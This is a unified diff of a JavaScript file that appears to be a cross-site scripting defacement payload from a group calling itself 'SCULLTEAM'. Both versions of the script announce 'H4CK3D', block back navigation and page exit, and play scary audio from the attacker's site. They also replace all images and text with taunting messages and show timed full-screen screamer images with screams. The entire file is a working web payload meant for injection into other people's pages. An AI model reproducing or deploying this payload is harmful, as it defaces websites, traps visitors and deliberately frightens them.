@@ -1,76 +1,82 @@
-alert('H4CK3D BY SCULLTEAM');
+alert('H4CK3D BY SULLTEAM');
 
-// Блокировка возврата назад
+// Отмена возврата (частично)
+
 window.history.pushState(null, null, window.location.href);
-window.onpopstate = function () {
+
+window.onpopstate = function(event) {
     window.history.pushState(null, null, window.location.href);
 };
+
 window.addEventListener('beforeunload', function (e) {
     e.preventDefault();
     e.returnValue = '';
 });
 
-// Воспроизведение страшной музыки
+
+// Запуск музыки
+
 setTimeout(function () {
     var scaryMusic = document.createElement("audio");
     scaryMusic.src = "https://scullteam.github.io/XSS/scary.mp3";
-    scaryMusic.loop = true;
     scaryMusic.play();
 }, 1000);
 
-// Замена изображений на два поочерёдно
-var imageUrls = [
-    "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg",
-    "https://i.ibb.co/3mW0gHbN/SCULLTEAM.png"
-];
 
-function cycleImages() {
-    var images = document.getElementsByTagName("img");
-    var currentIndex = 0;
+// Замена изображений
 
-    setInterval(function () {
-        for (var i = 0; i < images.length; i++) {
-            images[i].src = imageUrls[currentIndex];
-        }
-        currentIndex = (currentIndex + 1) % imageUrls.length;
-    }, 4000);
+var images = document.getElementsByTagName("img");
+var replacementPath = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";
+
+for (var i = 0; i < images.length; i++) {
+    images[i].src = replacementPath;
 }
 
-cycleImages();
 
 // Замена текста
+
+var paragraphsForReplace = document.getElementsByTagName("p");
+var h1ForReplace = document.getElementsByTagName("h1");
+var linksForReplace = document.getElementsByTagName("a");
 var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
 var replacementLinkText = "THERE IS NO ESCAPE";
 
-["p", "h1", "h2", "h3", "h4", "h5", "h6", "label"].forEach(tag => {
-    var elements = document.getElementsByTagName(tag);
-    for (var i = 0; i < elements.length; i++) {
-        elements[i].textContent = replacementText;
-    }
-});
-
-var links = document.getElementsByTagName("a");
-for (var i = 0; i < links.length; i++) {
-    links[i].textContent = replacementLinkText;
+for (var i = 0; i < paragraphsForReplace.length; i++) {
+    paragraphsForReplace[i].textContent = replacementText;
 }
 
+for (var i = 0; i < h1ForReplace.length; i++) {
+    h1ForReplace[i].textContent = replacementText;
+}
+
+for (var i = 0; i < linksForReplace.length; i++) {
+    linksForReplace[i].textContent = replacementLinkText;
+}
+
+
 // Замена <a> на <p>
-var aTags = Array.from(document.getElementsByTagName("a"));
-aTags.forEach(function (link) {
-    var newP = document.createElement("p");
-    newP.textContent = link.textContent;
-    for (var i = 0; i < link.attributes.length; i++) {
-        var attr = link.attributes[i];
-        newP.setAttribute(attr.name, attr.value);
+
+var links = Array.from(document.getElementsByTagName("a"));
+
+links.forEach(function(link) {
+    var newParagraph = document.createElement("p");
+    newParagraph.textContent = link.textContent;
+
+    for (var attr, i = 0, attrs = link.attributes, l = attrs.length; i < l; i++) {
+        attr = attrs[i];
+        newParagraph.setAttribute(attr.name, attr.value);
     }
-    link.parentNode.replaceChild(newP, link);
+
+    link.parentNode.replaceChild(newParagraph, link);
 });
 
-// Скример на весь экран
+
+// Скример на весь экран + запуск крика
+
 function showFullScreenImg() {
     var fullScreenImg = document.createElement("img");
     fullScreenImg.id = "fullScreenImg";
-    fullScreenImg.src = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";
+    fullScreenImg.src = "https://wallpapers.com/images/high/scary-face-pictures-fvx05bim45ctjiwh.webp";
 
     var audio = document.createElement("audio");
     audio.src = "https://scullteam.github.io/XSS/krik.mp3";
@@ -86,7 +92,6 @@ function showFullScreenImg() {
     }, 800);
 }
 
-// Таймеры скримера
 setTimeout(showFullScreenImg, 6000);
 setTimeout(showFullScreenImg, 13000);
 setTimeout(showFullScreenImg, 25000);
